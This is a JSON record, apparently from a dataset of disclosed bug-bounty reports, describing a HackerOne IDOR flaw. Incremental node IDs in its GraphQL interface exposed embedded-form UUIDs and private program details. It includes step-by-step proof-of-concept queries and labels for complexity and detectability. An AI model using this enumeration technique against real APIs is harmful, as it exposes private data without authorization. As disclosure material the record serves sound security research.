@@ -1,0 +1,52 @@
+{
+    "reported_to": "HackerOne",
+    "reported_by": "jobert ",
+    "title": "Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details",
+    "content": "\nIt's possible for an attacker to enumerate embedded submission form UUIDs through HackerOne's GraphQL node interface. In normal application behavior, an embedded submission form is queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute force attacks. However, the UUID is not the primary key of these models. Instead, in the backend, it still has an auto incremental primary key. Because of that they can be queried directly using the node interface. From the node interface, the UUID is exposed, which can then be used to obtain the same information an invited reporter can access.\nProof of concept\nIn order to reproduce the vulnerability, follow the steps below.\nconsider the following node ID: Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\ndecode the ID (base64), which will look something like gid://hackerone/EmbeddedSubmissionForm/9\nchange the primary key identifier, and base64 encode it\nexecute the following GraphQL query:\nRequest\nCode 139 Bytes\n1query {\n2  node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") {\n3    ... on EmbeddedSubmissionForm {\n4      uuid\n5    }\n6  }\n7}\nResponse\nCode 132 Bytes\n1{\n2  \"data\": {\n3    \"node\": {\n4      \"id\": \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\",\n5      \"uuid\": \"\u2588\u2588\u2588\u2588\"\n6    }\n7  }\n8}\ntake the UUID, and append ?embedded_submission_form_uuid=:uuid to the GraphQL request\nsubmit the following query to obtain the program information:\nRequest\nCode 263 Bytes\n1POST /graphql?embedded_submission_form_uuid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\n2Host: hackerone.com\n3...\n4\n5{\"query\":\"query { node(id: \\\"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\\\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}\",\"variables\":{}}\nResponse\nCode 220 Bytes\n1{\n2  \"data\": {\n3    \"node\": {\n4      \"id\": \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\",\n5      \"uuid\": \"\u2588\u2588\u2588\",\n6      \"team\": {\n7        \"handle\": \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n8        \"policy\": \"The policy.\"\n9      }\n10    }\n11  }\n12}\nImpact\nAny unauthenticated user can obtain the same information about a private program as a participating hacker. This may reveal sensitive information about private programs on HackerOne, such as their policy, terms, resolved bug count, bounty table, etc.\nThere are essentially two vulnerabilities here: the ability to directly query the EmbeddedSubmissionForm object and the fact that by specifying a UUID, the Team object exposes too much information.\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Insecure Direct Object Reference (IDOR)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1547260620,
+    "report_url": "https://hackerone.com/reports/447930",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "HIGH",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Decode a base64 node ID to reveal the internal structure (e.g., gid://hackerone/EmbeddedSubmissionForm/9)"
+        ],
+        [
+            2,
+            "Modify the primary key in the decoded ID, re-encode it in base64, and use it in a GraphQL query to fetch the UUID"
+        ],
+        [
+            3,
+            "Use the obtained UUID in a subsequent GraphQL request to access private program details (team handle, policy, etc.)"
+        ]
+    ],
+    "vuln_description": "The vulnerability allows unauthenticated enumeration of embedded submission form UUIDs via HackerOne's GraphQL node interface, exposing sensitive private program details (policy, bounty table, etc.) that should only be accessible to invited reporters. The issue stems from two flaws: (1) direct querying of EmbeddedSubmissionForm objects via incremental primary keys, and (2) excessive data exposure when a valid UUID is provided.",
+    "reason": "The attack requires understanding of GraphQL's node interface, UUID manipulation, and chaining two distinct vulnerabilities (ID enumeration + excessive data exposure). While the components are documented (base64, GraphQL), their exploitation requires non-obvious interactions (primary key inference, UUID reuse).",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "idor_detectable": true,
+    "authnz_byppass_detectable": true,
+    "is_simple_payload": false,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "idor_detectable": true,
+        "authnz_byppass_detectable": true
+    }
+}
